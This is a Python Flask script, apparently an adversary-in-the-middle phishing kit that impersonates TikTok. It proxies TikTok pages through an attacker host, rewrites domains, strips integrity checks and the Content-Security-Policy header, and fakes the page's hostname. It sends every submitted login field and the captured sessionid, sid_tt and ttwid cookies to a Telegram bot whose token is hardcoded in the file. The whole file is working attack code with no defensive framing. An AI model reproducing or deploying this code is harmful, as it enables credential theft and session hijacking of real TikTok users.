import os, re, json, urllib3, requests
from flask import Flask, request, make_response, redirect
from urllib.parse import urljoin
from werkzeug.middleware.proxy_fix import ProxyFix

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = Flask(__name__)
a.wsgi_app = ProxyFix(a.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
a.secret_key = os.urandom(32).hex()

T = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"
C = "1367401179"

class E:
    def __init__(self):
        self.d = "www.tiktok.com"
        self.p = ["www.tiktok.com", "tiktok.com", "m.tiktok.com", "sf16-scmcdn-va.akamaized.net"]

    def n(self, m):
        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
        except: pass

    def r(self, t, h):
        for d in self.p:
            t = t.replace(f"https://{d}", f"https://{h}")
            t = t.replace(f"//{d}", f"//{h}")
        t = re.sub(r'integrity="[^"]+"', '', t)
        if '<head>' in t:
            i = f"<script>Object.defineProperty(window.location, 'hostname', {{ get: function() {{ return '{self.d}'; }} }});</script>"
            t = t.replace('<head>', f'<head>{i}')
        return t

e = E()

# تعديل المسار الرئيسي ليقوم بالتوجيه لصفحة تسجيل الدخول فوراً
@a.route('/')
def home():
    return redirect('/login')

@a.route('/<path:x>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def f(x):
    h = request.headers.get('Host', '').split(':')[0]
    u = urljoin(f"https://{e.d}", x)
    if request.query_string: u += '?' + request.query_string.decode()

    H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
    H['Host'] = e.d

    if request.method == 'POST':
        D = request.form.to_dict() or request.get_json(silent=True) or {}
        if D:
            e.n(f"📥 <b>TikTok Input:</b>\n<code>{json.dumps(D, indent=2)}</code>")

    try:
        R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
        B = R.content
        if any(x in R.headers.get('Content-Type', '') for x in ['html', 'javascript']):
            try: B = e.r(R.content.decode('utf-8', errors='ignore'), h).encode()
            except: pass

        r = make_response(B)
        r.status_code = R.status_code
        for k, v in R.headers.items():
            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'set-cookie']:
                r.headers[k] = v

        for k, v in R.cookies.items():
            r.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=h)

        if 'sessionid' in R.cookies:
            ck = [f"{k}={v}" for k, v in R.cookies.items() if k in ['sessionid', 'sid_tt', 'ttwid']]
            e.n(f"🎼 <b>SUCCESS! TikTok Session:</b>\n<code>{'; '.join(ck)}</code>")

        if R.status_code in [301, 302, 303]:
            l = R.headers.get('Location', '').replace(e.d, h)
            r.headers['Location'] = l
        return r
    except: return "System Busy", 503

if __name__ == '__main__':
    a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
